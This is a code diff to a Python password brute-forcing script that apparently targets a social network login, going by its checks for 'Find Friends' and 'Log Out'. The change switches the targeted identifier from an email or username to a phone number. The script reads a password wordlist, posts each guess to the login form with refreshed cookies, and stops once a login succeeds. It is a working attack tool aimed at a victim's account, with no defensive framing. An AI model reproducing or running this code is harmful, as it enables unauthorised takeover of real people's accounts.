@@ -31,11 +31,11 @@ def create_form():
     return form, cookies
 
 
-def is_this_a_password(email, index, password):
+def is_this_a_password(number, index, password):
     global PAYLOAD, COOKIES
     if index % 10 == 0:
         PAYLOAD, COOKIES = create_form()
-        PAYLOAD['email'] = email
+        PAYLOAD['number'] = number
     PAYLOAD['pass'] = password
     r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
     if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
@@ -52,11 +52,11 @@ if __name__ == "__main__":
         sys.exit(0)
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
     print("Password file selected: ", PASSWORD_FILE)
-    email = input('Enter Email/Username to target: ').strip()
+    number = input('Enter number to target: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
         print("Trying password [", index, "]: ", password)
-        if is_this_a_password(email, index, password):
+        if is_this_a_password(number, index, password):
             break
